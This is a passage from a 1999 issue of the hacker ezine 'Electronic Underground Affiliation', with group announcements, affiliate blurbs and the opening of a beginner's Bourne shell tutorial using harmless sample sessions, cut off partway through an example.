---
title: "EUA-V2I6"
ezine: "eua"
---

# EUA-V2I6

**Ezine:** eua

<div className="ascii-content">

```
Electronic Underground Affiliation
Volume 2, Issue 6		
September 1999

The newbie's guide to the arts of hacking, phreaking, cypher- & cryptopunking, w3-surfing, bad-assed type of mag that give people the "inside information."  Are you interested? Do you want to know more?  The Electronic Underground Affiliations sole purpose is to provide current information about network security, Internet news, 
information about the local scene and how you fit into it all.  

"The reason `hackers' seek out new knowledge is not for personal profit, but for general knowledge."

Crammed in this Edition

******************************************************
i.    About this Edition
ii.   EUA Affiliations

0001	Bourne Shell Programing  Part 1
0010	Unix for Intermediate Users Part 1
0011	MS-NSAAdvisory from  Andrew Ferrnades
0100	Interview with the Cryptography Scientest Andrew Ferrnades 
	by Forensic
0101	Snippets 411 compiled by The Raven
0110	SendMail Info by Zhart
0111	Hacker News Network
1000	DECLASSIFIEDS (H/P Related Materials)
1001	Websites & Supporters
1010	Community News EUA 411General Goings On
1011	About the EUA and Shout Outs
1100	And Coming Next Edition...

******************************************************
Before we get started:
FINE PRINT & LEGAL DISCLAIMER:  The E.U.A. will, from time to time, contain articles on activities that are illegal.  WE DO NOT CONDONE ILLEGAL ACTIVITIES.  This information is provided purely for informational and educational purposes only.  E.U.A. is protected under the First Amendment of the United States Constitution.  We 
do not promote, endorse, or condone the use of any information in this publication for the purpose of illegal or illicit gain. This publication may contain articles and/or topics that may be offensive to some people.  If you can not handle these topics PLEASE DO NOT READ THIS PUBLICATION.  Again YOU should NOT participate in any actions that can be construed as illegal by the United States, Regional, and Local Governments.  This information is purely for educational and informational use only.

With that, the lawyers & judges should be happy.

++++++++++++++++++++++

Looking for a Mentor?

Are you looking for a mentor and a teacher in the dark arts of hacking and phreaking? Want to learn all you can about how computer and telephone networks really work?  Well join us on irc.xnet.org in #EUA and join in.  Hit our web sites at one of the:

	http://www.eua.tzo.org/

******************************************************

i.    About this Edition

About this Edition of the EUA Zine
Welcome to the September `99 edition of the EUA Monthly.  Well, this edition was brought on by a hurricane party, hurricane's (actually one hurricane and one "tropical storm") and has really come around to be fun.  The EUA now is now at eua.tzo.org - full time.  We are offering contributing members access to ftp space, e-mail, and web space. We're still trying to get everything we need to move the site over to SPARC 
platform in the next few months - we are still working on firming up the details now.  We looked at an ISDN line for the site as well, but now it looks like we're going to shark a pair of 56k's.  The P166 win box the server is on now is just not carrying the weight very well.  So as the platform changes, we'll be doing some upgrading to the system and services we offer.  All the fun and excitement that is the EUA HQ is looking for support. Not going to say much else, but if you have a service that you want to offer or provide support in some fashion, please contact us and let us know.

L8R All - EUA Staff

++++++++++++++++++++++

ii.   EUA Affiliations

So you want to know how and who makes the Electronic Underground Affiliation work so well?  

Well our information comes primarily from two sources: our members themseleves who gather the information from various resources around the Internet and our own info network, headed up by Forensic.  

The  information brokerage department puts a great deal of time and effort in monitoring the current events in the political, science and technology arenas as well as surfing through various newsgroups.  A special thanks always to them for their efforts in gathering, collating and verifying bleeding edge information.

The EUA has members that work in almost every possible kind of employment: information systems management, housewives, students, military... we've even got a mascot. We get a good variety of information from our broad band of members.

You can normaly find us on irc.xnet.org #eua where we meet to exchange information, gather reports and investigate current topics and even teach a class now and again.

SOME OF THOSE WHO WE HAVE AFFILIATIONS WITH

Hacker News Network				Columbia 2032
l0pht Heavy Industries				Canadian Tom's
    			    	Attrition

Hacker News Network 
 
	The Hacker News Network's mission is twofold. Our first 
mission is to deliver the real news from the computer underground 
for the computer underground. The reporting will not be dumbed 
down to match the computer illiteracy of the average TV viewer.  
Our second mission is to report the activities of the underground 
without the biases of the mainstream media. You will not see the 
terms "hacker" and "criminal" used interchangeably, nor the 
phrases "brilliant misguided youth" and "script kiddie". The HNN 
site is updated every day, except weekends and holidays with the 
latest news effecting the hacker scene. We try to have the days 
update posted before 12 noon EST. If you want to share something 
cool you have seen or heard about, write it up with links if 
appropriate and send it to submit@hackernews.com.  

L0PHT Heavy Industries

Just a bunch of hackers who got together and started working on projects together. One of the projects turned out to be L0pht.com.  
 
   There are remnants of different groups that make up L0pht such 
as RDT,    cDc, RL, etc. We didn't start this thing off to make 
money. We did this,  and still do, out of a love we have for 
technology and making it do things  that it might not have 
originally been meant to. 
 
   Split into two 'groups' that make up L0pht: a hardware group and 
a software group. The hardware group works with wireless 
communications, packet radio, microwave links, and various 
telephony projects. The software group deals a lot with computer 
security of various OS's. However the type and scope of various 
projects vary widely as the interest of the individuals  that make up 
the L0phT change often. Every member of the L0pht has specific 
interests and varying areas of expertise, which makes for a wide 
variety of projects. 

Attrition

The attrition.org staff have been called everything from a "hacker 
gang" to "hate mongers" to a "computer crime advocacy group" 
and -- most recently -- an FBI front. We have even been accused of 
being part of a global conspiracy to track down hundreds of 
thousands of Central Americans and throw them into 
concentration camps in the event of a U.S. invasion of Nicaragua.  
 
No, we are NOT a hacker gang. We are NOT hate mongers. We are 
NOT an FBI front, nor anything else industry charlatans like to call 
us. We ARE hedonists, sick little monkeys, and the people our 
mothers warned us about. We probably do hate you, but not 
necessarily. Flip a coin and find out ya chimp. Unfortunately, we 
cannot comment on the Nicaragua thing right now...at least not 
until the fourth Senate Panel Investigation concludes. And if we 
were to spill the beans, we've been told our black helicopter flight 
time would be revoked. As you can guess, that isn't condusive to 
low altitude fly-bys and harassing low income wackos. (We plan on 
arriving at con in style this year.)  

Columbia 2032

Columbia 2032 is dedicated to only two things. The dissemination of so 
called questionable information, and the freedom to express ideas. Our goals are not only for the hackish, or phreakish, or anarchic, but for even those who oppose such ways. We encourage as much information as possible to be sent to use for its diffusal into the uneducated masses. The ignorance that is seen as happiness has a simple cure, and that is to destroy the blockade around information, we must work, as a whole, to destroy the proverbial firewall around the data that will free the millions who do not yet even know that they are captive. We cannot strike, as a hackish and hence individualistic community, in one group, but cliques can see their common goal, and take it on in nondestructive ways. Barriers and borders are the only thing to be broken, as information and knowledge are too valuable to even taint, as 
Corporate Ineptity has done. Such agencies that claim to inform the public do nothing but poison them with propaganda that will only make the powerful stronger, and will only push those clouded in darkness deeper into the cave of ignorance. This magazine, as well as others like it, strives to be a beacon, a single, bright point for the groups of people who wish to learn. If enough of these lights can form, then perhaps we can form our own wall, one to protect the transaction of data and knowledge to a society that for so long has unknowingly hungered for it.  
 
-Absolute Matter and Enigma, Editors of Columbia 2032; 1999 

Candian Tom's

	Answering questions from a subscriber base of about four thousand people, CanadianTom offer's a membership site that contains a collection of information that like-minded people who dabble in hacking and cracking can  have access to. A simple hobby farmer with a whole lot of time, Tom spends  his time tracking down things that many people are too busy for. Tom says  that he "spends a large percentage of my day answering questions from  subscribers from Harmless Strategies newsletter and researching answers for them."  
  
	In years past Tom has been involved as the Director of "The undernet" and a little site called "HackCorp". "I guess that people feel comfortable asking me things that they wouldn't ask someone else about hacking, cracking, phreaking."  With a large percentage of his members are over 25 years old, they have more or less settled down in their radical thinking and they are trying to keep up with what is happening on the net.  
  
This site is a definite must see for all areas of interest, from privacy on the net to hacking.  

++++++++++++++++++++++

0001	Bourne Shell Programing  Part 1

1.  BOURNE SHELL OVERVIEW
     1.1  What is the Bourne Shell?
     1.2  Making a Bourne Shell Script Executable
     1.3  Tracing Mechanisms

2.  USER, SHELL, AND READ-ONLY SHELL VARIABLES
     2.1  User Variables
     2.2  Shell Variables
          2.2.1  HOME
          2.2.2  IFS
          2.2.3  MAIL
          2.2.4  MAILPATH
          2.2.5  MAILCHECK
          2.2.6  PATH
          2.2.7  PS1
          2.2.8  PS2
     2.3  Read-Only User Variables
     2.4  Read-Only Shell Variables
          2.4.1  Name of the Calling Program
          2.4.2  Arguments
          2.4.3  Shift
          2.4.4  Set
          2.4.5  expr

3.  POSITIONAL PARAMETERS
     3.1  Reading Input Into a Shell Variable
     3.2  Command Substitution
     3.3  Comments in BourneShell Scripts
     3.4  BourneShell Environment - Exporting Variables

4.  CONTROL CONSTRUCTS
     4.1  Types of Tests Used with Control Constructs
     4.2  Test on Numeric Values
     4.3  Test on Character Strings
     4.4  Test on File Types
     4.5  if then
     4.6  if then else
     4.7  if then elif
     4.8  for
     4.9  while
     4.10  until
     4.11  case

5. COMPILING PROGRAMS IN UNIX
    5.1  "C": Sample Program with a Main and Two Functions in One        
    5.2  "C": Compiling a Program
    5.3  "C": Renaming the Executable Module
    5.4  "C": Giving a Name to the Output File
    5.5  "C": Producing an Assembly Listing
    5.6  "C": Main and Two Functions in Three Separate Source Files
    5.7  "C": Compiling but Not Producing an Executable Module
    5.8  FORTRAN: Sample Program a Main and Two Subroutine
    5.9  FORTRAN: Compiling a Program
    5.10  FORTRAN: Renaming the Executable Module
    5.11  FORTRAN: Giving a Name to the Output File
    5.12  FORTRAN: Producing an Assembly Listing
    5.13  FORTRAN: Main and Two Subroutines in Three Separate Source Files
    5.14  FORTRAN: Compiling But Not Producing an ExecutableModule
    5.15  FORTRAN: Compiling Object Files to Produce an Executable Module
    5.16  COBOL: Sample Program with a Main and Two Subroutines
    5.17  COBOL: Compiling a Program
    5.18  COBOL: Running a Program

1.  BOURNESHELL OVERVIEW

The BourneShell is both a command-line interpreter and a high-
level programming language.  When it is acting as a command-line
interpreter, it processes commands as you enter them at the command
prompt.  When you use it as a programming language, it processes
commands that are stored in files known as BourneShell scripts. 
This course will show you how to create and execute BourneShell
scripts.  We will explore BourneShell programming including such
features as variables, control structures, processes, and
executable files.

The BourneShell is one of three shells available on most UNIX
systems.  Bourne is the accepted standard for System V UNIX.  The
other shells are being used more and more.  The other shells are
the CShell and the KornShell.  The CShell is BSD (Berkeley Software
Distribution) UNIX. BSD was developed at the University of
California at Berkeley, California. Most of the features found in
the BourneShell are also found in the other shells; there are
differences, however.  The CShell and KornShell are not standard
on UNIX System V but are generally available.

BourneShell scripts allow you to group command lines together and
execute them by entering a single command at the command line. This
allows complex functions to be completed by any user, and
repetitive functions can be completed easily.  Input and output
can also be redirected from a BourneShell script.

1.1  What is the BourneShell?

BourneShell is a high level programming language and a command line
interpreter. 

The command to invoke the BourneShell is:
	Command Format:  sh [-acefhiknrstuvx] [args]                 
                (See Appendix A for a complete list of options etc)          

A Shell script is an executable plain file that contains UNIX and
shell commands. To execute the shell script type the name of the
script at the prompt. A simple shell script called shell_ex is
shown in the following example. The output from the execution of
the shell is also shown.

Sample Session:

		$cat shell_ex                                                 
 		echo "This is a very simple shell procedure "                 
 		echo "created with the basic echo command "                   
 		echo "and three other very basic commands "                   
 		echo                                                          
 		ps                                                            
 		echo                                                           
 		who                                                           
 		echo                                                          
 		ls                                                            
 		$sh shell_ex                                                  

 This is a very simple shell procedure created with the very basic echo command                      
 and three other very basic commands                           
                                                               
 PID    TTY     TIME    COMMAND                                
 10443 rt02120  0:01    sh                                     
 10427 rt02120  0:04    ksh                                    
                                                               
 sgavlick  rt021e0   Sep 7   13:26                             
 teacher   rt021b0   Sep 7   14:39                             
                                                               
 memo                                                          
 class_notes                                                   
 $                                                             

1.2  Making a Bourne Shell Script Executable

A BourneShell script is an ordinary file that contains commands
which can be executed in sequence by entering one command at the
BourneShell prompt.  In order for a script to be executed, it must
first be executable.  This is done with the chmod command.

Sample Session:


 		$cat shell_ex                                                 
 		echo "This is a very simple shell procedure "                 
 		echo "created with the basic echo command "                   
 		echo "and three other very basic commands "                   
 		echo                                                          
 		ps                                                            
 		echo                                                          
 		who                                                           
 		echo                                                          
 		ls                                                            
		$                                                             

If the ls -l shell_ex command were entered, we would see the protections assigned 
to this file.

Sample Session:

		$ls -l shell_ex                                               
 		-rw-r--r-- 1 teacher class  66 Sep 7 10:24 shell_ex           
 		$                                                             

 The character in column one is the type of file. 

     -  =  ordinary (plain) disk file

     d  =  directory

     b  =  block special file

     c  =  character special file

     p  =  fifo file ("named pipe") special file

     l  =  symbolic link

Notice that the script file in the previous sample session has the
following file protections:

    User   - Read and Write
    Group  - Read
    Other  - Read

No execute permissions have been granted for user, group, or other. 
If we try to execute this script by typing its name, the following
would result.

Sample Session:

		$shell_ex                                                     
 		shell_ex: execute permission denied                           
 		$                                                             

This error message would indicate that execute permission was
denied.  The BourneShell script could not be executed.  To change
the permissions for the BourneShell script, use the chmod command.

Sample Session:

 		$chmod 755 shell_ex                                           
 		$ls -l shell_ex                                               
 		-rwxr-xr-x 1 teacher class  66 Sep 7  10:26 shell_ex          
 		$                                                             

Now that the permissions have been changed to allow user, group,
and others to execute the file, it will execute properly.

Sample Session:

		$shell_ex                                                     

 This is a very simple shell procedure                         
 created with the basic echo command                           
 and three other very basic commands                           
                                                               
 PID    TTY     TIME    COMMAND                                
 10443 rt02120  0:01    sh                                     
 10427 rt02120  0:04    ksh                                    
                                                               
 sgavlick  rt021e0   Sep 7   13:26                             
. teacher   rt021b0   Sep 7   14:39                             .
.                                                               .
                                                               .
The protections will work as you expect.  Execute permission for
the user will allow you (the owner) to run the BourneShell script.
Group permissions allow anyone in your group to execute the script,
and other permission allows anyone on the system to execute the
script.

1.3  Tracing Mechanisms

It is possible to have a trace made of the BourneShell script as
it executes. This is invaluable for debugging purposes. All that
is required is to give an option to the BourneShell.   This is done
by including an option on the call to "sh". The command to do this
is:

     Command Format: sh [-acefhiknrstuvx] [args]               
     See Appendix A for a complete list of options etc         

The option to turn on tracing is -x. For an example, let's trace
the execution of the simple script shell_ex.

Sample session:

     	$cat shell_ex                                             
     	echo "This is a very simple shell procedure "             
     	echo "created with the basic echo command "               
     	echo "and three other very basic commands "               
     	echo                                                      
     	ps                                                        
     	echo                                                      
     	who                                                       
     	echo                                                      
     	ls                                                        
     	$                                                         

Execute the BourneShell script using the -x option on the call to
the shell. The following sample session shows how to do this and
it shows the results of the trace.

Sample session:

     	$sh -x shell_ex                                           
     	+ echo This is a very simple shell procedure              
     	This is a very simple shell procedure                     
     	+ echo created with the basic echo command                
     	created with the basic echo command                       
     	+ echo and three other very basic commands                
     	and three other very basic commands                       
     	+ echo                                                    
                                                               
     + ps                                                      
     PID    TTY      TIME       COMMAND                        
     10443 rt01120   0:01       sh                             
     10427 rt02120   0:04       ksh                            
     + echo                                                    
                                                               
     + who                                                     
     sgavlick  rt021e0   Sep 7  13:26                          
     teacher   rt02120   Sep 7  14:39                          
     + echo                                                    
                                                               
     + ls                                                      
     memo                                                      
     class_notes                                               
     $                                                         

The commands as read from the BourneShell script are indicated by
the plus sign (+). The next line or lines are the results of the
execution of the command. Using this tracing option allows you to
se the execution of each command in the script and see the results
of that execution.

2.  USER, SHELL, AND READ-ONLY SHELL VARIABLES

The BourneShell has no true numeric variables.  It uses string
variables to represent numbers, as well as text.  String variables
are able to take on the value of a string of characters.  There are
three types of variables in the BourneShell.  They are user
variables, BourneShell variables, and Read-only BourneShell
variables.

You can declare, initialize, read, and modify user variables from
a BourneShell script or from the command line.  The BourneShell
itself declares and initializes shell variables, but you can read
and modify them.  The BourneShell also initializes the read-only
shell variables, and you can read but not modify them.

2.1  User Variables

It is legal to assign any sequence of non-blank characters as the
name of a variable.  The sample session below creates a variable
called person and initializes it with the string Richard.

It is important to note that you must NOT precede or follow the
equal sign with a space or TAB character.

Sample Session:
                       
  $person=Richard                                              

This sample session indicates that person does not represent the 
string Richard.  The string person is echoed as person.  The
BourneShell will only do the substitution of the value of the
variable when the name of the variable is preceded with a dollar
sign ($).  

Sample Sesssion:

  $echo person                                                 
  person                                                       
  $echo $person                                                
  Richard                                                      
  $                                                            

If you want to have imbedded spaces in a variable, it is necessary
to quote the string.

Sample Session:

  $person='Richard and Kathleen'                               
  $echo $person                                                
  Richard and Kathleen                                         
  $                                                            

The echo utility copies its arguments to the standard output.  The
command echo $person displays the value of the variable person. 
It will not display $person because the BourneShell doesn't pass
$person as an argument.  The leading dollar sign ($) causes the
BourneShell to substitute the value of the variable and then passes
that value to the utility.  The echo utility then displays the
value of the variable, not its name, never knowing that you called
it with a variable.  The BourneShell passed the same command line
as if you had typed in echo Richard and Kathleen.  The BourneShell
can be prevented from doing this substitution by entering one of
the following:

Sample Sessions:

  $echo $person                                                
  Richard and Kathleen                                         
  $                                                            
                                                                
In this session the contents of the variable person are displayed.
The BourneShell made the substitution because the variable name
person is preceded by a dollar sign ($).

  $echo \$person                                               
  $person                                                      
  $                                                            

In the above example the variable person is preceded by a dollar
sign ($) but the dollar sign has a backslash (\) ahead of it. The
backslash has the effect of cancelling the special meaning of the
character following the backslash. In this case, the special
meaning of the dollar sign is ignored and the substitution is not
done.

  $echo '$person'                                              
  $person                                                      
  $                                                            

The single quote marks (') causes the characters between the marks
to be taken as literal. The shell makes no attempt to interpret the
meanings of these characters. The shell passes these characters on
with no substitution. 

  $echo "$person"                                              
  Richard and Kathleen                                         
  $                                                            

The double quote marks do not prevent the shell from making
substitution; and the value of the variable will be displayed by
the utility.

2.2  Shell Variables

The BourneShell declares and initializes variables that determine
such things as your home directory, what directories the shell will
look in when you give commands, how often to look for mail, your
prompt, and many other things.  We will look at several of these
BourneShell variables and their functions.  You can assign new
values to these variables from the command line or from the
execution of the .profile file in your home directory.

2.2.1  HOME

The first BourneShell variable that we will look at is the HOME
variable.  By default, the home directory is the current working
directory after you login.  The system administrator determines
your home directory when you establish an account and places that
information in the /etc/passwd file.  When you login, the
BourneShell gets that pathname and assigns it to the HOME variable.

When you enter a cd command with no argument, the utility takes
the name of the directory from the HOME variable and makes it the
current working directory.  If you change the HOME variable to
another directory pathname, the utility will make the new directory
the current working directory.

Sample Session:

 $echo $HOME                                                   
 /user0/rharding                                               
 $cd                                                           
 $pwd                                                          
 /user0/rharding                                               
 $HOME=/user0/rharding/eng                                     
 $cd                                                           
 $pwd                                                          
 /user0/rharding/eng                                           
 $                                                             

This example shows how the value of the HOME variable affects the
cd utility.  The cd command will use the value of the HOME variable
as the pathname for the current working directory.

2.2.2  IFS

This is the internal-field separator BourneShell variable.  You
can always use a space or tab to separate characters on the command
line.  When you assign the IFS variable to another character, you
can also use this character as the field separator.

Example:

.................................................................
. $num_args a:b:c:d                                             .
.................................................................

This example shows only one argument, namely a:b:c:d.

.................................................................
.  $IFS=:                                                       .
.  $num_args a:b:c:d                                            .
.................................................................

This example now shows four different arguments; each being
separated by the new IFS, (:).

2.2.3  MAIL

The MAIL variable contains the name of the file that the mail (and
mailx) utilities use to store your mail.  Usually, the absolute
pathname of this file is /usr/mail/name, where name is your login
name.

Example:

.................................................................
. $MAIL=/usr/mail/rharding                                      .
.................................................................

2.2.4  MAILPATH

This variable contains a list of filenames separated by colons. If
set, the BourneShell will inform you when any of these files are
modified (i.e. when new mail arrives).  Normally, this variable is
not set.

2.2.5  MAILCHECK

This variable specifies how often, in seconds, the BourneShell will
check for new mail.  The default is 600 seconds.  If set to 0, it
will check for new mail each time before it gives you a prompt.

2.2.6  PATH

This BourneShell variable will describe the directories that will
be searched looking for the program that you want to execute.  The
BourneShell looks in several directories for a file that has the
same name as the command that you entered.  The PATH variable
controls this search path. Normally, the first directory searched
is the current working directory.  If the program is not found,
the search continues in the /bin and then the /usr/bin directory. 
Generally, these directories contain executable programs.  If the
program is not found in one of these directories, the BourneShell
reports that the program can't be found (or executed).

The PATH variable lists the pathnames in the order in which the
search will proceed.  The pathnames are separated by a colon (:).
If nothing (null string) precedes the colon, that indicates to
start the search at the current working directory.

Example:

.................................................................
. $PATH=:/user0/rharding/bin:/bin:/usr/bin                      .
. $                                                             .
.................................................................

This PATH variable indicates to start the search for the program
at the current working directory, then look in the directory
/user0/rharding/bin, then /bin, and finally /usr/bin.

If each user has a unique path specified, each user can execute a
different program by giving the same command.  The search for the
program stops when it is satisfied; thus, you can use the same name
for your own programs as the standard UNIX utilities.  To do this,
simply put your program in one of the first directories that the
BourneShell searches.

2.2.7  PS1

This is the BourneShell prompt which lets you know that the shell
is waiting for you to give it a command.  The default BourneShell
prompt is a dollar sign ($).  The shell stores the prompt as a
string variable in PS1.  When you change the value of this
variable, the appearance of the prompt will change.  When you are
working on several different machines, it might be useful to have
the prompt be the name of the machine you are working on.

Sample Session:

 $pwd                                                          
 /user0/rharding                                               
 $PS1='domax0: '                                               
 domax0:                                                       

Notice that prompt is now domax0:

2.2.8  PS2

This variable is called the secondary prompt.  If the command is
not completed on one line and must be continued on the next line,
the prompt for that continued line is PS2.  The default is >. This
prompt indicates that the BourneShell is expecting you to finish
the previous command line.

Sample Session:

 $echo 'demonstration of prompt string                         
 >2'                                                           
 demonstration of prompt string                                
 2                                                             
 $PS2='Continue? '                                             
 $echo 'demonstration of                                       
 Continue? prompt string 2'                                    
 demonstration of                                              
 prompt string 2                                               
 $                                                             

Notice how the secondary prompt was changed to "Continue? ".

2.3  Read-Only User Variables

The contents of the user variables and the shell variables can be
modified by the user.  It is possible to assign a new value to
them.  The new value can be assigned from the dollar ($) prompt or
from inside a BourneShell script.  Read-only variables are
different.  The value of read-only variables can not be changed.

The variable must be initialized to some value; and then, by
entering the following command, it can be made read only.

  Command format:    readonly variable_name                    
  variable_name = name of the variable to be made read only    

Sample Session:

 $person=Kathleen                                              
 $readonly person                                              
 $echo $person                                                 
 Kathleen                                                      
 $person=Richard                                               
 person: is read only                                          
 $                                                             

The readonly command given without any arguments will display a
list of all the read-only variables.

Sample Session:

 $person=Kathleen                                              
 $readonly person                                              
 $example=Richard                                              
 $readonly example                                             
 $readonly                                                     
 readonly person                                               
 readonly example                                              
 $                                                             

2.4  Read-Only Shell Variables

The read-only shell variables are similar to the read-only user
variables; except the value of these variables is assigned by the
shell, and the user CANNOT modify them.

2.4.1  Name of the Calling Program

The shell will store the name of the command you used to call a
program in the variable named $0.

It has the number zero because it appears before the first argument
on the command line.

Sample Session:

 $cat name_ex                                                  
 echo 'The name of the command used'                           
 echo 'to execute this script was' $0                          
 $name_ex                                                      
 The name of the command used                                  
 to execute this script was name_ex                            
 $                                                             

2.4.2  Arguments

The BourneShell will store the first nine command line arguments
in the variables named $1, $2, ..., $9.  These variables appear in
this section because you cannot change them using the equal sign. 
It is possible to modify them using the set command.

Sample Session:

 $cat arg_ex                                                   
 echo 'The first five command line'                            
 echo 'arguments are' $1 $2 $3 $4 $5                           
 $arg_ex Richard Kathleen Douglas                              
 The first five command line                                   
 arguments are Richard Kathleen Douglas                        
 $                                                             

The script arg_ex will display the first five command-line
arguments.  The variables representing $4 and $5 have a null value.

The BourneShell variable $* represents all of the command-line
arguments as shown in the following example.

Sample Session:

 $cat display_all                                              
 echo $*                                                       
 $display_all Richard Kathleen Douglas                         
 Richard Kathleen Douglas                                      
 $                                                             

The BourneShell variable $# contains the number of arguments on
the command line.  This is a string variable that represents a
decimal number.  You can use the expr utility to perform
calculations with that number and test to perform logical tests on
it.

Sample Session:

 $cat num_args                                                 
 echo 'This script was called with'                            
 echo $# 'arguments'                                           
 $num_args Richard Kathleen Douglas                            
 This script was called with                                   
 3 arguments                                                   
 $                                                             

2.4.3  Shift

The shift command promotes each of the command-line arguments. 
The second argument, represented by $2, is now the first argument,
represented by $1.  The third becomes the second and so on until
the last argument becomes the next to last.  You can access only
the first nine command-line arguments (as $1 through $9).  The
shift command gives you access to the tenth, and the first becomes
unavailable.  There is no "unshift" command that will return the
arguments that are no longer available.

Sample Session: 

 $cat demo_shift                                               
 echo 'arg1='$1 '  arg2='$2 '   arg3='$3                       
 shift                                                         
 echo 'arg1='$1 '  arg2='$2 '   arg3='$3                       
 shift                                                         
 echo 'arg1='$1 '  arg2='$2 '   arg3='$3                       
 shift                                                         
 echo 'arg1='$1 '  arg2='$2 '   arg3='$3                       
 shift                                                         
 $demo_shift Richard Kathleen Douglas                          
 arg1=Richard  arg2=Kathleen  arg3=Douglas                     
 arg1=Kathleen arg2=Douglas   arg3=                            
 arg1=Douglas  arg2=          arg3=                            
 demo_shift: cannot shift                                      
 $                                                             

The BourneShell will display an error message when the script
executes a shift command after it has run out of variables.
2.4.4  Set

The Set command will display a list of all the variables that are
set when it has no arguments.

Sample Session:

 $set                                                          
 HOME=/user0/teacher                                           
 IFS=                                                          
                                                               
 LOGNAME=richard                                               
 MAIL=/usr/mail/richard                                        
 MAILCHECK=600                                                 
 PATH=:/bin:/usr/bin                                           
 PS1=$                                                         
 PS2=>                                                         
 SHELL=/bin/sh                                                 
 TERM=vt100                                                    
 TZ=MST7MDT                                                    
 $                                                             

When set is called with arguments, it sets the value of the
command-line arguments ($1-$n) to the arguments.  The example sets
the first three arguments.

Sample Session:

 $cat set_ex                                                   
 set who really cares                                          
 echo $#: $*                                                   
 $set_ex                                                       
 3: who really cares                                           
 $                                                             

2.4.5  expr

The expr command will perform arithmetic in the BourneShell.

   Command format:  expr expression                            
   See Appendix C for a complete list of expressions           

The arguments are taken as an expression. After the evaluation has
taken place, the result is written to standard output.  The terms
of the expression must be separated by blanks.  Special characters
to the shell must be escaped.  Strings containing blanks or other
special characters must be quoted.

Sample Session:

 $expr 7 + 8 + 10                                              
 25                                                            
 $expr 10 - 8                                                  
 2                                                             
 $expr 10 '*' 4                                                
 40                                                            
 $expr 135 / 5                                                 
 27                                                            
 $                                                             

expr will also work with user defined variables as in the following
example:

Sample Session:

 $cat data                                                     
 8                                                             
 15                                                            
 25                                                            
 $cat express                                                  
 count=0                                                       
 tot=0                                                         
 for a in `cat data`                                           
 do                                                            
 tot=`expr $tot + $a`                                          
 count=`expr $count + 1`                                       
 done                                                          
 avg=`expr $tot / $count`                                      
 echo "The average is $avg"                                    
 $                                                             


Let's execute the script "express" with tracing on so we can follow
the execution.

Sample Session:


 $sh -x express                                                
 count=0                                                       
 tot=0                                                         
 + cat data                                                    
 + expr 0 + 8                                                  
 tot=8                                                         
 + expr 0 + 1                                                  
 count=1                                                       
 + expr 8 + 15                                                 
 tot=23                                                        
 + expr 1 + 1                                                  
 count=2                                                       
 + expr 23 + 25                                                
 tot=48                                                        
 + expr 2 + 1                                                  
 count=3                                                       
 + expr 48 / 3                                                 
 avg=16                                                        
 + echo The average is 16                                      
 The average is 16                                             
 $                                                             

3.  POSITIONAL PARAMETERS


A BourneShell script can also read in command-line arguments.  
The first argument is referred to as $1, the second is $2, and so
on.  Command-line arguments are referred to as positional
parameters.

Let's look at an example BourneShell script to see how these are
used.

Sample Session:

 $cat neat_shell                                               
 echo $1 $2 $3                                                 
 echo $0 is the name of the shell script                       
 echo "There were $# arguments."                               
 echo $*                                                       
 $                                                             

Insure that the BourneShell script is executable by issuing this
command:

Sample Session:


    $chmod a+x neat_shell                                      
    $                                                          

Now, if we type the name of the BourneShell script with no
arguments, we get the following results.

Sample Session:

 $neat_shell                                                   
                                                               
 neat_shell is the name of the shell script                    
 There were 0 arguments.                                       
                                                               
 $                                                             

In this sample session, there were no arguments given so none were
printed.  $0 is the positional parameter that refers to the name
of the script.  Since there were no arguments given with this
invocation of neat_shell, there were zero arguments listed.      
              
3.1  Reading Input Into a Shell Variable

The BourneShell script can read user input from standard input.  
The read command will read one line from standard input and assign
the line to one or more variables.  The following example shows how
this works.

Sample Session:

 $cat read_script                                              
 echo "Please enter a string of your choice"                   
 read a                                                        
 echo $a                                                       
 $                                                             

This simple script will read one line from standard input
(keyboard) and assign it to the variable a.

Sample Session:

 $read_script                                                  
 Please enter a string of your choice                          
 Here it is                                                    
 Here it is                                                    
 $                                                             

The line read from standard input can also be assigned to several
variables as shown in the following example.


Sample Session:
                                                 
 $cat reads                                                    
 echo "Please enter three strings"                             
 read a b c                                                    
 echo $a $b $c                                                 
 echo $c                                                       
 echo $b                                                       
 echo $a                                                       
 $                                                             

This time, we will turn on the trace mechanism and follow the
execution of this BourneShell script.

Sample Session:

 $sh -x reads                                                  
 + echo Please enter three strings                             
 Please enter three strings                                    
 + read a b c                                                  
 this is more than three strings                               
 + echo this is more than three strings                        
 this is more than three strings                               
 + echo more than three strings                                
 more than three strings                                       
 + echo is                                                     
 is                                                            
 + echo this                                                   
 this                                                          
 $                                                             


It is interesting to note that the spaces separate the values for
the variables a,b, and c.  For example, the variable a was assigned
the string this, the variable b was assigned the string is, and the
remainder of the line was assigned to c (including the spaces).

Sample Session:
                                                 
 $cat read_ex                                                  
 echo  'Enter line: \c'                                        
 read line                                                     
 echo "The line was: $line"                                    
 $                                                             
                                                                
In this example, the \c option will suppress the carriage return.
The single quote marks protect the backslash from being interpreted
by the shell.  Also notice that the double quote marks have no
effect on the substitution of the variable line.                 
           
Sample Session:

 $read_ex                                                      
 Enter line: All's well that ends well                         
 The line was: All's well that ends well                       
 $                                                             

3.2  Command Substitution

You can execute a command by enclosing it within two grave accent
marks [these are sometimes called backquotes (`)].  The BourneShell
will replace the command and the grave marks with the output from
the command.

Sample Session:

 $cat dir                                                      
 dir=`pwd`                                                     
 echo 'You are using the' $dir 'directory'                     
 $                                                             
                                                                
NOTE:     The grave marks lean to the left, and the apostrophes 
         lean to the right.  The grave marks enclose the pwd  
         command.                                              
                                                                
Sample Session:

 $dir                                                          
 You are using the /user0/rharding directory                   
 $                                                             

The important thing to notice here is that the pwd command was
executed; and the output, /user0/rharding, was then assigned to
the variable dir.

It is not necessary to assign the output of a command to a variable
as shown in the previous example.  The command substitution can
occur directly as shown in the next example.

Sample Session:

 $cat dir2                                                     
 echo 'You are using the' `pwd` 'directory'                    
 $dir2                                                         
 You are using the /user0/rharding directory                   
 $                                                             

One final example will show a practical use of command
substitution.  This BourneShell script will use the date command
to provide the date in a useful format.

The normal output from the date command looks like the following.

Sample Session:

 $date                                                         
 Wed Sep 12 18:02:05 MDT 1990                                  
 $                                                             

Here's a BourneShell script that rearranges the output into a more
useable format.

Sample Session:

 $cat dateset                                                  
 set `date`                                                    
 echo $*                                                       
 echo                                                          
 echo 'Argument 1:' $1                                         
 echo 'Argument 2:' $2                                         
 echo 'Argument 3:' $3                                         
 echo 'Argument 4:' $4                                         
 echo                                                          
 echo $2 $3, $6                                                
 $dateset                                                      
 Wed Sep 12 18:02:05 MDT 1990                                  
                                                               
 Argument 1: Wed                                               
 Argument 2: Sep                                               
 Argument 3: 12                                                
